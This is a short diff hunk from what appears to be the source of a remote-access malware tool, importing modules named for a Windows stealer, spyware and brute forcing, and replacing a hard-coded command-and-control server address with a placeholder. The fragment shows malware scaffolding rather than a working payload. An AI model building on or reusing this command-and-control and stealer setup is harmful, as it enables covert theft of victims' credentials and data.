@@ -15,7 +15,7 @@ import windows_stealer as wsl
 import spyware as spy
 import BruteForce_Module as bf
 
-C2_URL = "http://10.10.135.88:5000"
+C2_URL = "your_c2_server_url"
 # C2_URL = "http://127.0.0.1:5000"
 WHOAMI = subprocess.getoutput("whoami")
 SEMAPHORE = threading.Semaphore(7)
